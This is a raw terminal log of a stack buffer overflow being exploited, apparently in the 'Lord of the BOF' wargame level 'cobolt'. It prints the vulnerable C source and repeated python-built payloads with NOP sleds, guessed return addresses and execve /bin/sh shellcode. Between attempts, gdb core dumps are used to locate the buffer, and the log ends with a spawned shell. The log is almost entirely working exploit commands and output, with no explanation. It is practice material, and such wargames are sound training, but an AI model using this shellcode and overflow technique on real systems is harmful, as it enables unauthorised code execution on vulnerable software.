[gremlin@localhost gremlin]$ ./cobolt `python -c 'print "\x90"*20+"\x00\xf9\xff\xbf"+"\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
¿ 
Segmentation fault
[gremlin@localhost gremlin]$ ./cobolt `python -c 'print "\x90"*20+"\x00\xf9\xff\xbf"+"\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
¿ 
Segmentation fault
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*20'`
¿AAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
[gremlin@localhost gremlin]$ gdb -c core 
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux".
Core was generated by `./cobalt ¿'.
Program terminated with signal 11, Segmentation fault.
#0  0x90909090 in ?? ()
(gdb) x/50 $esp
0xbffffad0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffae0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffaf0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffb00:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffb10:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffb20:	0x41414190	0x41414141	0x41414141	0x41414141
0xbffffb30:	0x41414141	0xbfff0041	0xbffffd0f	0xbffffd2c
0xbffffb40:	0xbffffd37	0xbffffd45	0xbffffd88	0xbffffd9b
0xbffffb50:	0xbffffdb0	0xbffffdc0	0xbffffdcd	0xbffffdec
0xbffffb60:	0xbffffe05	0xbffffe10	0xbffffe1d	0xbffffe25
0xbffffb70:	0xbfffffe8	0x00000000	0x00000003	0x08048034
0xbffffb80:	0x00000004	0x00000020	0x00000005	0x00000006
0xbffffb90:	0x00000006	0x00001000
(gdb) x/50 $espwqd
Value can't be converted to integer.
(gdb) q
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*2000'`

Segmentation fault (core dumped)
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*20'`
AAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
[gremlin@localhost gremlin]$ gdb -c core
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux".
Core was generated by `./cobalt AAAAAAAAAAAAAAAAAAAA'.
Program terminated with signal 11, Segmentation fault.
#0  0x40030902 in ?? ()
(gdb) x/50 $esp
0xbffffb30:	0x00000002	0xbffffb74	0xbffffb80	0x40013868
0xbffffb40:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffb50:	0x08048430	0x00000002	0xbffffb74	0x080482e0
0xbffffb60:	0x080484ac	0x4000ae60	0xbffffb6c	0x40013e90
0xbffffb70:	0x00000002	0xbffffc5b	0xbffffc79	0x00000000
0xbffffb80:	0xbffffc8e	0xbffffcb0	0xbffffcba	0xbffffcc8
0xbffffb90:	0xbffffce7	0xbffffcf7	0xbffffd0f	0xbffffd2c
0xbffffba0:	0xbffffd37	0xbffffd45	0xbffffd88	0xbffffd9b
0xbffffbb0:	0xbffffdb0	0xbffffdc0	0xbffffdcd	0xbffffdec
0xbffffbc0:	0xbffffe05	0xbffffe10	0xbffffe1d	0xbffffe25
0xbffffbd0:	0xbfffffe8	0x00000000	0x00000003	0x08048034
0xbffffbe0:	0x00000004	0x00000020	0x00000005	0x00000006
0xbffffbf0:	0x00000006	0x00001000
(gdb) 
0xbffffbf8:	0x00000007	0x40000000	0x00000008	0x00000000
0xbffffc08:	0x00000009	0x08048380	0x0000000b	0x000001f5
0xbffffc18:	0x0000000c	0x000001f5	0x0000000d	0x000001f5
0xbffffc28:	0x0000000e	0x000001f5	0x00000010	0x0fabfbff
0xbffffc38:	0x0000000f	0xbffffc6b	0x00000000	0x00000000
0xbffffc48:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc58:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc68:	0x69000000	0x00363836	0x6f632f2e	0x746c6162
0xbffffc78:	0x41414100	0x41414141	0x41414141	0x41414141
0xbffffc88:	0x41414141	0x454c0041	0x504f5353	0x7c3d4e45
0xbffffc98:	0x7273752f	0x6e69622f	0x73656c2f	0x70697073
0xbffffca8:	0x68732e65	0x00732520	0x52455355	0x454d414e
0xbffffcb8:	0x4948003d	0x49535453
(gdb) Quit
(gdb) q
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*20+"\x50\x00\x4c\x45"+"\x90"*10+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAP
Illegal instruction (core dumped)
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*20+"\x50\x00\x4c\x45"+"\x90"*1+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAP
Illegal instruction (core dumped)
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*20+"\x50\x00\x4c\x45"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAP
Illegal instruction (core dumped)
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*16+"\x50\x00\x4c\x45"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAP
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*20+"\x50\x00\x4c\x45"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAP
Illegal instruction (core dumped)
[gremlin@localhost gremlin]$ gdb -c core
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux".
Core was generated by `./cobalt AAAAAAAAAAAAAAAAAAAAP'.
Program terminated with signal 4, Illegal instruction.
#0  0x40030052 in ?? ()
(gdb) x/50 $esp
0xbffffb30:	0x00000002	0xbffffb74	0xbffffb80	0x40013868
0xbffffb40:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffb50:	0x08048430	0x00000002	0xbffffb74	0x080482e0
0xbffffb60:	0x080484ac	0x4000ae60	0xbffffb6c	0x40013e90
0xbffffb70:	0x00000002	0xbffffc6f	0xbffffc78	0x00000000
0xbffffb80:	0xbffffc8e	0xbffffcb0	0xbffffcba	0xbffffcc8
0xbffffb90:	0xbffffce7	0xbffffcf7	0xbffffd0f	0xbffffd2c
0xbffffba0:	0xbffffd37	0xbffffd45	0xbffffd88	0xbffffd9b
0xbffffbb0:	0xbffffdb0	0xbffffdc0	0xbffffdcd	0xbffffdec
0xbffffbc0:	0xbffffe05	0xbffffe10	0xbffffe1d	0xbffffe25
0xbffffbd0:	0xbfffffe8	0x00000000	0x00000003	0x08048034
0xbffffbe0:	0x00000004	0x00000020	0x00000005	0x00000006
0xbffffbf0:	0x00000006	0x00001000
(gdb) 
0xbffffbf8:	0x00000007	0x40000000	0x00000008	0x00000000
0xbffffc08:	0x00000009	0x08048380	0x0000000b	0x000001f5
0xbffffc18:	0x0000000c	0x000001f5	0x0000000d	0x000001f5
0xbffffc28:	0x0000000e	0x000001f5	0x00000010	0x0fabfbff
0xbffffc38:	0x0000000f	0xbffffc6a	0x00000000	0x00000000
0xbffffc48:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc58:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc68:	0x36690000	0x2e003638	0x626f632f	0x00746c61
0xbffffc78:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc88:	0x41414141	0x454c0050	0x504f5353	0x7c3d4e45
0xbffffc98:	0x7273752f	0x6e69622f	0x73656c2f	0x70697073
0xbffffca8:	0x68732e65	0x00732520	0x52455355	0x454d414e
0xbffffcb8:	0x4948003d	0x49535453
(gdb) 
0xbffffcc0:	0x313d455a	0x00303030	0x54534f48	0x454d414e
0xbffffcd0:	0x636f6c3d	0x6f686c61	0x6c2e7473	0x6c61636f
0xbffffce0:	0x616d6f64	0x4c006e69	0x414e474f	0x673d454d
0xbffffcf0:	0x6c6d6572	0x52006e69	0x544f4d45	0x534f4845
0xbffffd00:	0x39313d54	0x36312e32	0x36352e38	0x4d00312e
0xbffffd10:	0x3d4c4941	0x7261762f	0x6f70732f	0x6d2f6c6f
0xbffffd20:	0x2f6c6961	0x6d657267	0x006e696c	0x4d524554
0xbffffd30:	0x6574783d	0x48006d72	0x5454534f	0x3d455059
0xbffffd40:	0x36383369	0x54415000	0x752f3d48	0x6c2f7273
0xbffffd50:	0x6c61636f	0x6e69622f	0x69622f3a	0x752f3a6e
0xbffffd60:	0x622f7273	0x2f3a6e69	0x2f727375	0x52313158
0xbffffd70:	0x69622f36	0x682f3a6e	0x2f656d6f	0x6d657267
0xbffffd80:	0x2f6e696c	0x006e6962
(gdb) exit
Undefined command: "exit".  Try "help".
(gdb) quit
[gremlin@localhost gremlin]$ ls
cobalt  cobolt  cobolt.c  core  tmp
[gremlin@localhost gremlin]$ cat cobolt.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - cobolt
        - small buffer
*/

int main(int argc, char *argv[])
{
    char buffer[16];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*20+"\x50\x00\x4c\x45"+"A"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`AAAAAAAAAAAAAAAAAAAAP
Illegal instruction (core dumped)
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*20+"\xbf\xbf\xbf\xbf"+"A"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAA¿¿¿¿AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1￐h//shh/bin⏓ኂ°
                                                                                                                                           ̀ 
Segmentation fault (core dumped)
[gremlin@localhost gremlin]$ gdb -c co
cobalt    cobolt    cobolt.c  core      
[gremlin@localhost gremlin]$ gdb -c core 
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux".
Core was generated by `./cobalt AAAAAAAAAAAAAAAAAAAA¿¿¿¿AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
Program terminated with signal 11, Segmentation fault.
#0  0xbfbfbfbf in ?? ()
(gdb) x/50 $esp
0xbffffab0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffac0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffad0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffae0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffaf0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb00:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb10:	0x41414141	0x6850c031	0x68732f2f	0x69622f68
0xbffffb20:	0x50e3896e	0x89e18953	0xcd0bb0c2	0xbfff0080
0xbffffb30:	0xbffffdb0	0xbffffdc0	0xbffffdcd	0xbffffdec
0xbffffb40:	0xbffffe05	0xbffffe10	0xbffffe1d	0xbffffe25
0xbffffb50:	0xbfffffe8	0x00000000	0x00000003	0x08048034
0xbffffb60:	0x00000004	0x00000020	0x00000005	0x00000006
0xbffffb70:	0x00000006	0x00001000
(gdb) x/50 $esp-600
0xbffff858:	0xbffff8b8	0x00000000	0x00000000	0x00000000
0xbffff868:	0x00000000	0x400138d4	0x00000007	0x40009c50
0xbffff878:	0x00000018	0xbffff8a8	0xbffff8a4	0xbffff8a0
0xbffff888:	0x400002f4	0x00000000	0x00000000	0xbffffae4
0xbffff898:	0x00000002	0x00000000	0x40001528	0x000002c8
0xbffff8a8:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffff8b8:	0x40000000	0x00000000	0x400139d0	0x00000000
0xbffff8c8:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffff8d8:	0x40013a08	0x40013a00	0x400139d8	0x400139e0
0xbffff8e8:	0x400139e8	0x00000000	0x00000000	0x00000000
0xbffff8f8:	0x400139f0	0x400139f8	0x00000000	0x00000000
0xbffff908:	0x400139d0	0x40029b0e	0xbffff9e0	0x400081e6
0xbffff918:	0x40029ad5	0x40029ad5
(gdb) x/100 $esp-600
0xbffff858:	0xbffff8b8	0x00000000	0x00000000	0x00000000
0xbffff868:	0x00000000	0x400138d4	0x00000007	0x40009c50
0xbffff878:	0x00000018	0xbffff8a8	0xbffff8a4	0xbffff8a0
0xbffff888:	0x400002f4	0x00000000	0x00000000	0xbffffae4
0xbffff898:	0x00000002	0x00000000	0x40001528	0x000002c8
0xbffff8a8:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffff8b8:	0x40000000	0x00000000	0x400139d0	0x00000000
0xbffff8c8:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffff8d8:	0x40013a08	0x40013a00	0x400139d8	0x400139e0
0xbffff8e8:	0x400139e8	0x00000000	0x00000000	0x00000000
0xbffff8f8:	0x400139f0	0x400139f8	0x00000000	0x00000000
0xbffff908:	0x400139d0	0x40029b0e	0xbffff9e0	0x400081e6
0xbffff918:	0x40029ad5	0x40029ad5	0x40013868	0x400143e0
0xbffff928:	0x00004388	0x40013868	0x400143e0	0x000005b3
0xbffff938:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffff948:	0x00000000	0x40029b0e	0xbffffa20	0x400081e6
0xbffff958:	0x40029ad5	0x40029ad5	0x40013868	0x400143e0
0xbffff968:	0x0000785c	0x400081e6	0x40029ad5	0x0804826c
0xbffff978:	0x40013868	0x40013ed0	0x00000021	0x0804826c
0xbffff988:	0x40013868	0x00007080	0x00000066	0x40029ad5
0xbffff998:	0x00000000	0x400143e0	0x40021df0	0x00000708
0xbffff9a8:	0x40021fd0	0x4001ad70	0x400143e0	0x00000003
0xbffff9b8:	0x40014650	0x00000001	0xbffff9d8	0x40021df0
0xbffff9c8:	0x400145e4	0x0d790266	0xbffffa54	0x4002982c
0xbffff9d8:	0x40021df0	0x400143e0	0x400140d4	0x077905a6
(gdb) x/100 $esp-600
0xbffff858:	0xbffff8b8	0x00000000	0x00000000	0x00000000
0xbffff868:	0x00000000	0x400138d4	0x00000007	0x40009c50
0xbffff878:	0x00000018	0xbffff8a8	0xbffff8a4	0xbffff8a0
0xbffff888:	0x400002f4	0x00000000	0x00000000	0xbffffae4
0xbffff898:	0x00000002	0x00000000	0x40001528	0x000002c8
0xbffff8a8:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffff8b8:	0x40000000	0x00000000	0x400139d0	0x00000000
0xbffff8c8:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffff8d8:	0x40013a08	0x40013a00	0x400139d8	0x400139e0
0xbffff8e8:	0x400139e8	0x00000000	0x00000000	0x00000000
0xbffff8f8:	0x400139f0	0x400139f8	0x00000000	0x00000000
0xbffff908:	0x400139d0	0x40029b0e	0xbffff9e0	0x400081e6
0xbffff918:	0x40029ad5	0x40029ad5	0x40013868	0x400143e0
0xbffff928:	0x00004388	0x40013868	0x400143e0	0x000005b3
0xbffff938:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffff948:	0x00000000	0x40029b0e	0xbffffa20	0x400081e6
0xbffff958:	0x40029ad5	0x40029ad5	0x40013868	0x400143e0
0xbffff968:	0x0000785c	0x400081e6	0x40029ad5	0x0804826c
0xbffff978:	0x40013868	0x40013ed0	0x00000021	0x0804826c
0xbffff988:	0x40013868	0x00007080	0x00000066	0x40029ad5
0xbffff998:	0x00000000	0x400143e0	0x40021df0	0x00000708
0xbffff9a8:	0x40021fd0	0x4001ad70	0x400143e0	0x00000003
0xbffff9b8:	0x40014650	0x00000001	0xbffff9d8	0x40021df0
0xbffff9c8:	0x400145e4	0x0d790266	0xbffffa54	0x4002982c
0xbffff9d8:	0x40021df0	0x400143e0	0x400140d4	0x077905a6
(gdb) 
0xbffff9e8:	0xbffffa6c	0x08048211	0x4001b630	0x400143e0
0xbffff9f8:	0xbffffa7c	0x08048256	0x40021ca0	0x400143e0
0xbffffa08:	0xbffffa8c	0x400261a6	0x4001ead0	0x400143e0
0xbffffa18:	0x40020290	0x400143e0	0xbffffa58	0x4000a7fd
0xbffffa28:	0x400143d0	0x400146b0	0x00000007	0x4000a74e
0xbffffa38:	0x401081ec	0x4000ae60	0xbffffaf4	0x400143e0
0xbffffa48:	0x40021df0	0x401088c0	0x4002982c	0x40021df0
0xbffffa58:	0xbffffa88	0x4000a970	0xbffffc8e	0xfffffe9f
0xbffffa68:	0x4005d920	0x400143e0	0xbffffa88	0x40066070
0xbffffa78:	0x40106980	0x080484dc	0xbffffa98	0x401081ec
0xbffffa88:	0xbffffaa8	0x08048476	0x080484dc	0xbffffa98
0xbffffa98:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffaa8:	0x41414141	0xbfbfbfbf	0x41414141	0x41414141
0xbffffab8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffac8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffad8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffae8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffaf8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb08:	0x41414141	0x41414141	0x41414141	0x6850c031
0xbffffb18:	0x68732f2f	0x69622f68	0x50e3896e	0x89e18953
0xbffffb28:	0xcd0bb0c2	0xbfff0080	0xbffffdb0	0xbffffdc0
0xbffffb38:	0xbffffdcd	0xbffffdec	0xbffffe05	0xbffffe10
0xbffffb48:	0xbffffe1d	0xbffffe25	0xbfffffe8	0x00000000
0xbffffb58:	0x00000003	0x08048034	0x00000004	0x00000020
0xbffffb68:	0x00000005	0x00000006	0x00000006	0x00001000
(gdb) quit
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*20+"\xc8\xfa\xff\xbf"+"A"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`AAAAAAAAAAAAAAAAAAAAɺ
Segmentation fault (core dumped)
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*20+"\xc8\xfa\xff\xbf"+"A"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`¿AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1￐hAAAAAAAAAAAAAAAAAAAAɺ
Segmentation fault (core dumped)
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*20+"\xf8\xfa\xff\xbf"+"A"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`¿AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1￐hAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*20+"\xf8\xfa\xff\xbf"+"A"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
¿AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1￐hAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
[gremlin@localhost gremlin]$ gdb -c core 
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux".
Core was generated by `./cobalt ¿AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
(gdb) x/100x $esp
0xbffffad0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffae0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffaf0:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb00:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb10:	0x41414141	0x41414141	0x41414141	0x50c03141
0xbffffb20:	0x41414168	0x41414141	0x41414141	0x41414141
0xbffffb30:	0x41414141	0x00faf841	0xbffffd0f	0xbffffd2c
0xbffffb40:	0xbffffd37	0xbffffd45	0xbffffd88	0xbffffd9b
0xbffffb50:	0xbffffdb0	0xbffffdc0	0xbffffdcd	0xbffffdec
0xbffffb60:	0xbffffe05	0xbffffe10	0xbffffe1d	0xbffffe25
0xbffffb70:	0xbfffffe8	0x00000000	0x00000003	0x08048034
0xbffffb80:	0x00000004	0x00000020	0x00000005	0x00000006
0xbffffb90:	0x00000006	0x00001000	0x00000007	0x40000000
0xbffffba0:	0x00000008	0x00000000	0x00000009	0x08048380
0xbffffbb0:	0x0000000b	0x000001f5	0x0000000c	0x000001f5
0xbffffbc0:	0x0000000d	0x000001f5	0x0000000e	0x000001f5
0xbffffbd0:	0x00000010	0x0fabfbff	0x0000000f	0xbffffc00
0xbffffbe0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffbf0:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffc00:	0x36383669	0x632f2e00	0x6c61626f	0x41bf0074
0xbffffc10:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc20:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc30:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc40:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc50:	0x41414141	0x41414141	0x41414141	0x41414141
(gdb) quit
[gremlin@localhost gremlin]$ cat .       
.              ..             .bash_history  .bash_logout   .bash_profile  .bashrc        .emacs         .screenrc      
[gremlin@localhost gremlin]$ cat ./co
cobalt    cobolt    cobolt.c  core      
[gremlin@localhost gremlin]$ cat ./co
cobalt    cobolt    cobolt.c  core      
[gremlin@localhost gremlin]$ cat ./cobolt.c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - cobolt
        - small buffer
*/

int main(int argc, char *argv[])
{
    char buffer[16];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*20+"\xf8\xfa\xff\xbf"+"\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
¿AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1￐h//shh/bin⏓ኂ°
                                                                  ̀ 
Segmentation fault (core dumped)
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*20+"\xf8\xfa\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
¿1￐h//shh/bin⏓ኂ°
                ̀ 
Segmentation fault (core dumped)
[gremlin@localhost gremlin]$ gdb -c core 
GNU gdb 19991004
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you are
welcome to change it and/or distribute copies of it under certain conditions.
Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i386-redhat-linux".
Core was generated by `./cobalt ¿1￐h//shh/bin⏓葉
Program terminated with signal 11, Segmentation fault.
#0  0x90909090 in ?? ()
(gdb) x/100x $esp-100
0xbffffa7c:	0x401088c0	0x4002982c	0x40021df0	0xbffffab8
0xbffffa8c:	0x4000a970	0xbffffc77	0xfffffe9d	0x4005d920
0xbffffa9c:	0x400143e0	0xbffffab8	0x40066070	0x40106980
0xbffffaac:	0x080484dc	0xbffffac8	0x401081ec	0xbffffad8
0xbffffabc:	0x08048476	0x080484dc	0xbffffac8	0x909090bf
0xbffffacc:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffadc:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffaec:	0x90909090	0x90909090	0x90909090	0x31909090
0xbffffafc:	0x2f6850c0	0x6868732f	0x6e69622f	0x5350e389
0xbffffb0c:	0xc289e189	0x80cd0bb0	0x4000ae00	0xbffffb1c
0xbffffb1c:	0x40013e90	0x00000003	0xbffffc21	0xbffffc2a
0xbffffb2c:	0xbffffc77	0x00000000	0xbffffc8e	0xbffffcb0
0xbffffb3c:	0xbffffcba	0xbffffcc8	0xbffffce7	0xbffffcf7
0xbffffb4c:	0xbffffd0f	0xbffffd2c	0xbffffd37	0xbffffd45
0xbffffb5c:	0xbffffd88	0xbffffd9b	0xbffffdb0	0xbffffdc0
0xbffffb6c:	0xbffffdcd	0xbffffdec	0xbffffe05	0xbffffe10
0xbffffb7c:	0xbffffe1d	0xbffffe25	0xbfffffe8	0x00000000
0xbffffb8c:	0x00000003	0x08048034	0x00000004	0x00000020
0xbffffb9c:	0x00000005	0x00000006	0x00000006	0x00001000
0xbffffbac:	0x00000007	0x40000000	0x00000008	0x00000000
0xbffffbbc:	0x00000009	0x08048380	0x0000000b	0x000001f5
0xbffffbcc:	0x0000000c	0x000001f5	0x0000000d	0x000001f5
0xbffffbdc:	0x0000000e	0x000001f5	0x00000010	0x0fabfbff
0xbffffbec:	0x0000000f	0xbffffc1c	0x00000000	0x00000000
0xbffffbfc:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) q
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*20+"\xcc\xfa\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
¿1￐hAAAAAAAAAAAAAAAAAAAAͺ
Segmentation fault (core dumped)
[gremlin@localhost gremlin]$ bash2
[gremlin@localhost gremlin]$ ./cob
cobalt  cobolt  
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*20+"\xcc\xfa\xff\xbf"+"\x90"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAͺÿ¿1￐h//shh/bin⏓ኂ°
                                      ̀ 
bash$ [exit
sh: [exit: command not found
bash$ exit
exit
[gremlin@localhost gremlin]$ ./cobalt `python -c 'print"A"*20+"\xcc\xfa\xff\xbf"+"A"*100+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'` 
AAAAAAAAAAAAAAAAAAAAͺÿ¿AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1￐h//shh/bin⏓ኂ°
                                                                                                                                          ̀ 
bash$ id
uid=501(gremlin) gid=501(gremlin) groups=501(gremlin)
bash$      
bash$      
